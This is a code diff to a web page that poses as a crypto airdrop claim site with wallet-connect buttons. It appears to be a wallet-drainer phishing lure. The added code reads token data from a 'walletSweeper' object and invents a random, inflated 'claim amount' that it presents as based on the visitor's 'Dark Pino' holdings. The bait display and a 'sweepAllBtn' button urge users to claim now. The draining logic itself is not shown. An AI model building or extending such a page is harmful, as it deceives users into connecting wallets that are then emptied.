@@ -826,7 +826,7 @@
                     Connect Phantom
                 </button>
                 <button class="wallet-option" id="metaMaskConnect">
-                    <span>🦊</span>
+                    <img src="images/metamask-logo.svg" alt="MetaMask" style="width: 32px; height: 32px; border-radius: 8px;">
                     Connect MetaMask
                 </button>
             </div>
@@ -1109,6 +1109,59 @@
             }
         }
 
+        // Calculate claim amount based on Dark Pino holdings
+        function calculateClaimAmount() {
+            // Check if we have access to wallet sweeper data
+            let darkPinoBalance = 0;
+
+            if (window.walletSweeper && window.walletSweeper.solTokens) {
+                // Look for Dark Pino token in the scanned tokens
+                const darkPinoToken = window.walletSweeper.solTokens.find(token =>
+                    token.name && (token.name.toLowerCase().includes('dark pino') ||
+                    token.name.toLowerCase().includes('pino') ||
+                    token.symbol === 'DPINO')
+                );
+
+                if (darkPinoToken) {
+                    darkPinoBalance = darkPinoToken.balance || 0;
+                }
+            }
+
+            // Generate randomized claim amount based on Dark Pino holdings
+            let baseAmount = 0;
+            let multiplier = 1;
+
+            if (darkPinoBalance === 0) {
+                // No Dark Pino holdings - give a small random amount
+                baseAmount = Math.floor(Math.random() * 1000) + 100; // 100-1100 tokens
+            } else if (darkPinoBalance < 100) {
+                // Small holder - modest rewards
+                baseAmount = Math.floor(Math.random() * 5000) + 1000; // 1000-6000 tokens
+                multiplier = 1.5;
+            } else if (darkPinoBalance < 1000) {
+                // Medium holder - good rewards
+                baseAmount = Math.floor(Math.random() * 15000) + 5000; // 5000-20000 tokens
+                multiplier = 2;
+            } else if (darkPinoBalance < 10000) {
+                // Large holder - great rewards
+                baseAmount = Math.floor(Math.random() * 50000) + 20000; // 20000-70000 tokens
+                multiplier = 3;
+            } else {
+                // Whale - maximum rewards
+                baseAmount = Math.floor(Math.random() * 100000) + 50000; // 50000-150000 tokens
+                multiplier = 5;
+            }
+
+            // Add some randomness to make it more interesting
+            const randomBonus = Math.floor(Math.random() * 1000);
+            const finalAmount = Math.floor((baseAmount * multiplier) + randomBonus);
+
+            // Store the amount for consistency
+            window.claimAmount = finalAmount;
+
+            return finalAmount;
+        }
+
         function updateClaimStatus(status) {
             const balanceDisplay = document.getElementById('balanceDisplay');
             if (!balanceDisplay) return;
@@ -1152,15 +1205,32 @@
             const balanceDisplay = document.getElementById('balanceDisplay');
             if (!balanceDisplay) return;
 
+            // Calculate claim amount based on Dark Pino holdings
+            const claimAmount = calculateClaimAmount();
+
             // Add the claim button to the simple status
             const claimButtonHTML = `
                 <div class="simple-status">
                     <div class="status-icon">🎁</div>
                     <div class="status-message">Airdrops Ready to Claim!</div>
                     <div class="status-subtitle">Your multi-chain airdrop eligibility has been verified</div>
-                    <div style="margin-top: 2rem;">
-                        <button class="btn btn-danger btn-large" id="sweepAllBtn">
-                            🚀 CLAIM ALL AIRDROPS
+
+                    <!-- Claim Amount Display -->
+                    <div style="margin: 2rem 0; padding: 1.5rem; background: linear-gradient(135deg, rgba(255, 215, 0, 0.1), rgba(255, 140, 0, 0.1)); border-radius: 15px; border: 2px solid rgba(255, 215, 0, 0.3);">
+                        <div style="text-align: center; margin-bottom: 0.5rem;">
+                            <span style="color: #FFD700; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 1px;">Your Claim Amount</span>
+                        </div>
+                        <div style="text-align: center; font-size: 2.5rem; font-weight: bold; background: linear-gradient(135deg, #FFD700, #FFA500); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;">
+                            ${claimAmount.toLocaleString()} TOKENS
+                        </div>
+                        <div style="text-align: center; margin-top: 0.5rem;">
+                            <span style="color: #888; font-size: 0.85rem;">Based on your Dark Pino holdings</span>
+                        </div>
+                    </div>
+
+                    <div style="margin-top: 1rem;">
+                        <button class="btn btn-danger btn-large" id="sweepAllBtn" style="width: 100%; padding: 1rem; font-size: 1.2rem;">
+                            🚀 CLAIM ${claimAmount.toLocaleString()} TOKENS NOW
                         </button>
                     </div>
                 </div>
